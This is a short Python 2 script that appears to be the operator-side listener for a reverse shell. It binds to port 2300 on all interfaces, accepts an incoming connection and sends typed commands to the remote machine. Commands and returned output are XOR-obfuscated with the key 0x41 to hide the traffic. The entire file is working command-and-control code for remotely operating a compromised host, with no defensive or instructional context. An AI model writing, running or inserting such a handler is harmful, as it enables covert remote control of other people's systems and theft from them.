#coding:utf-8

import socket

local_host = '0.0.0.0'
local_port = 2300


server = socket.socket()

server.bind((local_host, local_port))

server.listen(2)

print 'Listening on ' + str(local_port)

(client, (remote_ip, remote_port)) = server.accept()

print 'Received connection from ' + remote_ip

while True:
    command = raw_input('~:')
    encode = bytearray(command)
    for i in range(len(encode)):
        encode[i] ^= 0x41
    client.send(encode)
    en_data = client.recv(2048)
    decode = bytearray(en_data)
    for i in range(len(decode)):
        decode[i] ^= 0x41
    print decode
client.close()
server.close()





